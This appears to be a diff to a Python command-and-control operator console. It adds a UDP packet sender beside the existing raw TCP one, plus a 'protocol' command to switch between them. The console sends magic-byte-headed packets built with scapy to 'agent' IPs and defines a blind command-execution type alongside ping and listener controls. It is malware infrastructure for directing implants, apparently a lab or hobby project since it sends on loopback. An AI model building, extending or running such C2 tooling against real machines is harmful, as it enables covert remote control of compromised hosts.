@@ -9,8 +9,9 @@ MAGIC_BYTES = 0x0b1e55ed
 C2_PORT = 6969
 CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02}
 
-def send_packet(cmd, cmd_type, agent_ip, port):
+def send_packet_TCP(cmd, cmd_type, agent_ip, port):
 
+    print("Sending via TCP")
     # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
     packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))
 
@@ -19,6 +20,16 @@ def send_packet(cmd, cmd_type, agent_ip, port):
 
     # Craft a raw TCP packet
     pkt = IP(dst=agent_ip) / TCP(dport=port, sport=54321, flags="PA") / Raw(load=packet)
+
+    send(pkt, iface="lo")
+
+def send_packet_UDP(cmd, cmd_type, agent_ip, port):
+
+    print("Sending via UDP")
+    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))
+    packet += cmd.encode()
+
+    pkt = IP(dst=agent_ip) / UDP(dport=port, sport=54321) / Raw(load=packet)
 
     send(pkt, iface="lo")
 
@@ -70,6 +81,8 @@ def start_listener():
 def shell():
 
     stop_listener = None
+    
+    sender_wrapper = send_packet_TCP
 
     while True:
         try:
@@ -89,6 +102,8 @@ def shell():
         input_arr = input_command.split()
         
         match input_arr[0].lower():
+
+            # Handle ping
             case "ping":
 
                 IP = input_arr[1]
@@ -98,23 +113,24 @@ def shell():
                 if len(input_arr) == 2:
 
                     port = random.randint(1, 65535)
-                    send_packet("ping", "CMD_PING", IP, random.randint(1, 65535))
+                    sender_wrapper("ping", "CMD_PING", IP, random.randint(1, 65535))
                     print(f"Sent ping to {IP} over port {port}")
                 
                 # ping <IP> <port>
                 elif len(input_arr) == 3:
 
                     port = int(input_arr[2])
-                    send_packet("ping", "CMD_PING", IP, port)
+                    sender_wrapper("ping", "CMD_PING", IP, port)
                     print(f"Sent ping to {IP} over port {port}")
 
                 else:
                     print(f"Ping usage: ping [IP] [PORT]\nPort is optional")
 
+            # Handle server start
             case "start":
 
 
-                if len(input_arr) == 2 and input_arr[1] == "listener":
+                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
                     if stop_listener:
                         print("Listener is already running")
                     else:
@@ -124,10 +140,11 @@ def shell():
                 else:
                     print("Start usage: start listener")
 
+            # Handle server stop
             case "stop":
 
 
-                if len(input_arr) == 2 and input_arr[1] == "listener":
+                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
                     if not stop_listener:
                         print("Listener is not running")
                     
@@ -139,6 +156,30 @@ def shell():
                 else:
                     print("Stop usage: stop listener")
 
+            case "protocol":
+
+                if len(input_arr) == 2 and input_arr[1].lower() == "tcp":
+
+                    if sender_wrapper == send_packet_TCP:
+                        print("Send protocol is already TCP")
+
+                    else:
+                        sender_wrapper = send_packet_TCP
+                        print("Switched send protocol to TCP")
+                
+                elif len(input_arr) == 2 and input_arr[1].lower() == "udp":
+
+                    if sender_wrapper == send_packet_UDP:
+                        print("Send protocol is already UDP")
+
+                    else:
+                        sender_wrapper = send_packet_UDP
+                        print("Switched send protocol to UDP")
+
+                else:
+                    print("Protocol usage: protocol [tcp/ip]")
+
+            # Handle exit
             case "exit" | "quit":
                 if stop_listener:
                     stop_listener()
